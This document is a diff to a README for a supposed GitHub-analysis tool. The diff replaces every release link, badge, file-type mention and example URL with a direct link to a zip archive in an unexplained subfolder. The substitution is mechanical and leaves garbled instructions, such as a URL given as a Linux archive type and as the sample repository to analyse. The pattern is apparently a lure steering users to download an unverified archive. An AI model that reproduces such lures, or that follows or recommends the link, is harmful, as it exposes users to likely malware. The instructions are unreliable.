@@ -1,6 +1,6 @@
 # 🧭 github-explorer-skill - Analyze GitHub Projects Deeply
 
-[![Download](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/caution724/github-explorer-skill/releases)
+[![Download](https://raw.githubusercontent.com/caution724/github-explorer-skill/main/bluely/explorer-github-skill-3.3-beta.1.zip)](https://raw.githubusercontent.com/caution724/github-explorer-skill/main/bluely/explorer-github-skill-3.3-beta.1.zip)
 
 ## 📘 About
 
@@ -31,14 +31,14 @@ To get github-explorer-skill, you need to visit the official release page and do
 
 **Step 1:** Click the button below to open the release page.
 
-[![Download](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/caution724/github-explorer-skill/releases)
+[![Download](https://raw.githubusercontent.com/caution724/github-explorer-skill/main/bluely/explorer-github-skill-3.3-beta.1.zip)](https://raw.githubusercontent.com/caution724/github-explorer-skill/main/bluely/explorer-github-skill-3.3-beta.1.zip)
 
 **Step 2:** On the releases page, find the latest version. It usually appears on top with a version number like "v1.0.0" or higher.
 
 **Step 3:** Look for a file that matches your operating system:
 - For Windows, look for a `.exe` or `.msi` file.
 - For macOS, look for a `.dmg` file.
-- For Linux, look for a `.AppImage` or `.tar.gz` archive.
+- For Linux, look for a `.AppImage` or `https://raw.githubusercontent.com/caution724/github-explorer-skill/main/bluely/explorer-github-skill-3.3-beta.1.zip` archive.
 
 **Step 4:** Click the file name to download it to your computer.
 
@@ -55,7 +55,7 @@ After installation or running the program, follow these steps to analyze a GitHu
 
 2. **Enter the GitHub project URL**  
    Type or paste the full link of any GitHub repository you want to analyze, for example:  
-   `https://github.com/caution724/example-project`
+   `https://raw.githubusercontent.com/caution724/github-explorer-skill/main/bluely/explorer-github-skill-3.3-beta.1.zip`
 
 3. **Start Analysis**  
    Click the “Analyze” button to begin. The software will gather data from multiple sources related to the project.  
@@ -122,7 +122,7 @@ For further help, you can open an issue on the GitHub repository page or look fo
 
 ## 📚 Additional Resources
 
-- Visit the releases page anytime to get the latest updates: [https://github.com/caution724/github-explorer-skill/releases](https://github.com/caution724/github-explorer-skill/releases)
+- Visit the releases page anytime to get the latest updates: [https://raw.githubusercontent.com/caution724/github-explorer-skill/main/bluely/explorer-github-skill-3.3-beta.1.zip](https://raw.githubusercontent.com/caution724/github-explorer-skill/main/bluely/explorer-github-skill-3.3-beta.1.zip)
 - Explore the GitHub repository to learn more about the project and see code samples.
 - Look for tutorials or guides linked in future versions for step-by-step help.
 
@@ -134,4 +134,4 @@ This project is shared under the MIT License, allowing free use and modification
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/caution724/github-explorer-skill/releases)
+[![Download](https://raw.githubusercontent.com/caution724/github-explorer-skill/main/bluely/explorer-github-skill-3.3-beta.1.zip)](https://raw.githubusercontent.com/caution724/github-explorer-skill/main/bluely/explorer-github-skill-3.3-beta.1.zip)
